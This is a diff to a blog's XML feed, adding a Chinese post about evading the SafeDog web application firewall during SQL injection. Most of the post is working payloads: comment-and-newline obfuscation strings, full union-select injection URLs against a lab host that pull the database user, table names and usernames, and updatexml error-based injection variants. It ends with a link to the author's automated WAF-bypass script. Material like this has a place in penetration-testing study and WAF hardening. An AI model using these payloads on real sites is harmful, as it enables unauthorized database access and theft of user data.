@@ -3,6 +3,21 @@
   
     
     <entry>
+      <title>Bypass安全狗注入-再见篇</title>
+      <link href="/posts/9d8606fc.html"/>
+      <url>/posts/9d8606fc.html</url>
+      <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1372563872&auto=1&height=66"></iframe><p>很久之前弄过狗，好像没弄过。那么在来弄弄这够吧，让其从一只狗变成一只二哈。奇妙的比喻<br><img src="https://s2.ax1x.com/2019/11/14/MUQNee.png" alt="MUQNee.png"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.secpulse.com/archives/109577.html" target="_blank" rel="noopener">【思路/技术】某大佬的BypassWAF新思路（附脚本） - SecPulse.COM | 安全脉搏</a></p><h1 id="开打"><a href="#开打" class="headerlink" title="开打"></a>开打</h1><p>安全狗的版本<br><img src="https://s2.ax1x.com/2019/11/14/MUQrSP.png" alt="MUQrSP.png"></p><p>常规的绕过：</p><pre><code>and 1=1和and 1=2被拦截Xor 1=1和Xor 1=2不拦截if((1=1),1,2)和if((1=2),1,2)不拦截</code></pre><p><img src="https://s2.ax1x.com/2019/11/14/MUQRoj.png" alt="MUQRoj.png"></p><p><img src="https://s2.ax1x.com/2019/11/14/MUQ7OU.png" alt="MUQ7OU.png"></p><p>order by以前使用<code>/**/OrDer/**/By/**/x</code>这样就可以过，现在不行了<br><img src="https://s2.ax1x.com/2019/11/14/MUlVfI.png" alt="MUlVfI.png"></p><p>后面使用上述文章的方法，现在还是能过的<br><img src="https://s2.ax1x.com/2019/11/14/MUlrN9.png" alt="MUlrN9.png"></p><pre><code>payload:/**/%23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0a</code></pre><p>上面的payload url解码后会变成<br><img src="https://s2.ax1x.com/2019/11/14/MUljHg.png" alt="MUljHg.png"><br>利用换行的方法跳过了注释</p><p>尝试使用文章的方法<br><img src="https://s2.ax1x.com/2019/11/14/MUlhHe.png" alt="MUlhHe.png"></p><pre><code>http://192.168.241.158/sql.php?id=0/**/union/**/%23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0aselect%201,user%23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0a() </code></pre><p><img src="https://s2.ax1x.com/2019/11/14/MUlH3t.png" alt="MUlH3t.png"></p><p>这里发现version这个会被拦截，<code>@@version</code>，<code>version/**/()</code>,<code>version/**/(/**/)</code>,<code>(((VeRsiOn/**/(/**/))))</code>还是不行- -，带有关键字version并且在select后面就会被k<br><img src="https://s2.ax1x.com/2019/11/14/MU1ivV.png" alt="MU1ivV.png"></p><pre><code>http://192.168.241.158/sql.php?id=0/**/union/**/%23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0aselect%201,table_name/**/%23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0afrom/**/%23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0ainformation_schema.tables/**/%23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0awhere/**/%23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0atable_schema=%22tests%22</code></pre><p><img src="https://s2.ax1x.com/2019/11/14/MUYMn0.png" alt="MUYMn0.png"></p><p><img src="https://s2.ax1x.com/2019/11/14/MUYc3d.png" alt="MUYc3d.png"></p><p>这里开了information_schema数据库保护还是没法绕过的（默认关闭）<br><img src="https://s2.ax1x.com/2019/11/14/MUYwB6.md.png" alt="MUYwB6.md.png"></p><pre><code>http://192.168.241.158/sql.php?id=0/**/union/**/%23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0aselect%201,username/**/%23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0afrom/**/users</code></pre><p><img src="https://s2.ax1x.com/2019/11/14/MUY2jI.png" alt="MUY2jI.png"></p><p>报错注入绕过</p><pre><code>updatexml() 不拦截updatexml(1,,1) 不拦截updatexml(1,concat,1) 拦截updatexml/**/#aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa (1,concat,1) 不拦截/**/and/**/updatexml/**/#aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa (1,concat(0x7e,(select/**/user/**/#aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ()),0x7e),1) 不拦截</code></pre><p><img src="https://s2.ax1x.com/2019/11/15/MUNXkT.png" alt="MUNXkT.png"></p><p>附bypass waf脚本<br><img src="https://s2.ax1x.com/2019/11/15/MUUNcj.md.png" alt="MUUNcj.md.png"></p><p><a href="https://github.com/422926799/note/tree/master/%E8%87%AA%E5%B7%B1%E5%86%99%E7%9A%84%E5%B7%A5%E5%85%B7/%E8%87%AA%E5%8A%A8%E5%8C%96bypass_waf" target="_blank" rel="noopener">note/自己写的工具/自动化bypass_waf at master · 422926799/note · GitHub</a></p>]]></content>
+      
+      
+        <tags>
+            
+            <tag> bypass </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
       <title>netsh后门</title>
       <link href="/posts/b31575cf.html"/>
       <url>/posts/b31575cf.html</url>
